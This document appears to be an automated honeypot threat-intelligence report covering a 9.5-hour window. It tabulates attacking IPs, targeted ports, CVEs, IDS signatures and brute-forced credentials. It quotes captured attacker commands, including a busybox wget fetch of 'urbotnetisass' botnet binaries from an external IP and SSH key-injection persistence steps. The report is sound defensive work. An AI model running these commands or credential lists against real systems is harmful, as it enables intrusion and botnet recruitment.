# Honeypot Situation Report

**Report Generation Time:** 2025-10-01T06:37:09Z
**Timeframe:** 2025-09-30T21:00:00Z to 2025-10-01T06:37:09Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-09-30T21:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T23:01:50Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T00:01:35Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T01:02:03Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T02:01:58Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T03:02:12Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T04:01:55Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T05:01:50Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T06:01:56Z.md

---

### **Executive Summary**

Over the last 9.5 hours, our honeypot network has observed **111,309** malicious events. The threat landscape has been dominated by high-volume, automated campaigns targeting SSH, SMB, and SMTP services. A significant portion of this activity, particularly a massive surge in SSH brute-force attempts, originated from the IP address **`161.35.152.121`**, a known malicious actor hosted by DigitalOcean.

Attackers have demonstrated a clear and consistent playbook: gain initial access via brute force or exploitation of known vulnerabilities, establish persistence by manipulating SSH authorized keys, and deploy multi-architecture malware payloads, most notably the custom **`urbotnetisass`** botnet client.

Active exploitation of **CVE-2022-27255**, a critical remote code execution vulnerability in Realtek SDKs affecting numerous IoT devices, has been a prominent feature of this period. This, combined with continued attempts to leverage older vulnerabilities, indicates that attackers are casting a wide net to compromise a broad spectrum of unpatched devices. The high prevalence of DoublePulsar backdoor signatures also confirms that exploits for MS17-010 (EternalBlue) remain a favored tool for initial access via SMB.

### **Detailed Analysis**

#### **Our IPs**

| Honeypot | Private IP      | Public IP        |
|----------|-----------------|------------------|
| hive-us  | 10.128.0.3      | 34.123.129.205   |
| sens-tai | 10.140.0.3      | 104.199.212.115  |
| sens-tel | 10.208.0.3      | 34.165.197.224   |
| sens-dub | 172.31.36.128   | 3.253.97.195     |
| sens-ny  | 10.108.0.2      | 161.35.180.163   |

#### **Attacks by Honeypot**

| Honeypot    | Attack Count |
|-------------|--------------|
| Cowrie      | 48151        |
| Honeytrap   | 20483        |
| Dionaea     | 11394        |
| Suricata    | 13817        |
| Ciscoasa    | 11071        |
| Mailoney    | 6522         |
| Tanner      | 573          |
| H0neytr4p   | 515          |
| Adbhoney    | 292          |
| Redishoneypot| 194          |
| Sentrypeer  | 254          |
| Honeyaml    | 186          |
| Miniprint   | 83           |
| ConPot      | 241          |
| ElasticPot  | 34           |
| Dicompot    | 64           |
| Ipphoney    | 24           |
| Heralding   | 57           |
| ssh-rsa     | 4            |

#### **Top Attacking IPs**

| IP Address      | Attack Count |
|-----------------|--------------|
| 161.35.152.121  | 8425         |
| 77.85.120.146   | 3124         |
| 113.161.17.144  | 3123         |
| 152.32.219.169  | 2512         |
| 218.17.50.212   | 1417         |
| 92.242.166.161  | 1646         |
| 45.130.190.34   | 1033         |
| 117.72.52.28    | 1250         |
| 88.214.50.58    | 844          |
| 47.242.0.187    | 1311         |

#### **Top Targeted Ports/Protocols**

| Port/Protocol | Attack Count |
|---------------|--------------|
| 445 (SMB)     | 13904        |
| 22 (SSH)      | 8031         |
| 25 (SMTP)     | 6522         |
| 8333          | 702          |
| 80            | 609          |
| 443           | 402          |
| 23 (Telnet)   | 473          |
| 6379 (Redis)  | 139          |
| 5060 (SIP)    | 246          |
| UDP/161 (SNMP)| 63           |

#### **Most Common CVEs**

| CVE                                     | Count |
|-----------------------------------------|-------|
| CVE-2002-0013, CVE-2002-0012 (SNMPv1)    | 53    |
| CVE-2022-27255 (Realtek SDK RCE)        | 11    |
| CVE-2019-11500                          | 17    |
| CVE-2021-3449 (OpenSSL DoS)             | 14    |
| CVE-2024-3721                           | 8     |
| CVE-2024-4577                           | 4     |
| CVE-2006-2369                           | 2     |
| CVE-1999-0517                           | 23    |
| CVE-2016-20016                          | 2     |
| CVE-2021-41773, CVE-2021-42013 (Apache) | 3     |

#### **Commands Attempted by Attackers**

| Command                                                                 | Count |
|-------------------------------------------------------------------------|-------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                  | 92    |
| `lockr -ia .ssh`                                                        | 92    |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`               | 92    |
| `uname -a`                                                              | 60    |
| `cat /proc/cpuinfo | grep name | wc -l`                                 | 53    |
| `w`                                                                     | 52    |
| `crontab -l`                                                            | 55    |
| `top`                                                                   | 55    |
| `whoami`                                                                | 53    |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/[file]; ...` | 13    |
| `Enter new UNIX password:`                                              | 36    |
| `rm -rf /tmp/secure.sh; pkill -9 secure.sh; ...`                        | 10    |

#### **Signatures Triggered**

| Signature                                                  | Count |
|------------------------------------------------------------|-------|
| ET DROP Dshield Block Listed Source group 1                | 2850  |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation | 2760  |
| ET SCAN NMAP -sS window 1024                               | 1285  |
| ET SCAN MS Terminal Server Traffic on Non-standard Port    | 231   |
| ET HUNTING RDP Authentication Bypass Attempt               | 40    |
| ET SCAN Sipsak SIP scan                                    | 94    |
| ET INFO Reserved Internal IP Traffic                       | 286   |
| ET EXPLOIT Realtek eCos RSDK ... Inbound (CVE-2022-27255) | 11    |

#### **Users / Login Attempts**

| Username/Password               | Count |
|---------------------------------|-------|
| `345gs5662d34/345gs5662d34`      | 65    |
| `root/nPSpP4PBW0`                 | 26    |
| `root/LeitboGi0ro`                | 14    |
| `root/2glehe5t24th1issZs`         | 15    |
| `root/3245gs5662d34`              | 12    |
| `foundry/foundry`                 | 14    |
| `superadmin/admin123`             | 6     |
| `test/zhbjETuyMffoL8F`            | 7     |
| `minecraft/3245gs5662d34`         | 3     |
| `root/MoeClub.org`                | 1     |

#### **Files Uploaded/Downloaded**

| Filename           | Count |
|--------------------|-------|
| `arm.urbotnetisass`  | 16    |
| `arm5.urbotnetisass` | 16    |
| `arm6.urbotnetisass` | 16    |
| `arm7.urbotnetisass` | 16    |
| `x86_32.urbotnetisass`| 16    |
| `mips.urbotnetisass` | 16    |
| `mipsel.urbotnetisass`| 16    |
| `sh`               | 98    |
| `Mozi.m`           | 2     |
| `wget.sh`          | 8     |
| `azenv.php`        | 3     |

---
### **Google Searches**
- OSINT report on IP address 161.35.152.121
- OSINT report on CVE-2022-27255

---

### **Key Observations and Anomalies**

1.  **Massive Attack Spike from DigitalOcean IP:** The IP address **`161.35.152.121`**, hosted by DigitalOcean, was responsible for an anomalously high number of attacks (8,425 events), primarily against the Cowrie SSH honeypot. OSINT confirms this IP is a known malicious actor involved in SSH and RDP scanning. This activity represents a significant, concentrated brute-force campaign from a single source.

2.  **Active Exploitation of Realtek `Pwn2Own` Vulnerability:** We observed direct exploitation attempts for **CVE-2022-27255**, a critical (CVSS 9.8) vulnerability in the Realtek SDK for eCos. This "zero-click" vulnerability allows for remote code execution on a vast number of IoT devices (routers, etc.) via a single malicious SIP packet. This indicates that threat actors are actively weaponizing publicly disclosed, high-impact vulnerabilities against common internet-connected hardware.

3.  **Consistent Botnet Deployment Tactic:** The attacker command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...` remains a staple. This command, which downloads and executes the `urbotnetisass` malware, shows a consistent methodology for compromising devices and assimilating them into a botnet. The use of multiple architectures highlights the broad target scope of this campaign.

4.  **SSH Key Persistence as a Standard Procedure:** Across almost all reports, the sequence of commands to delete the existing `.ssh` directory and inject the attacker's own public key (`mdrfckr`) is present. This is no longer an occasional tactic but a standard, automated step in the attacker's playbook for maintaining long-term access to compromised hosts.

5.  **Targeting of Mail Services:** The Mailoney and Honeytrap honeypots recorded a combined 23,045 events, with a significant focus on port 25 (SMTP). The top attacking IPs for this traffic, such as `92.242.166.161`, are likely engaged in large-scale campaigns to discover and exploit open mail relays for spam and phishing operations.
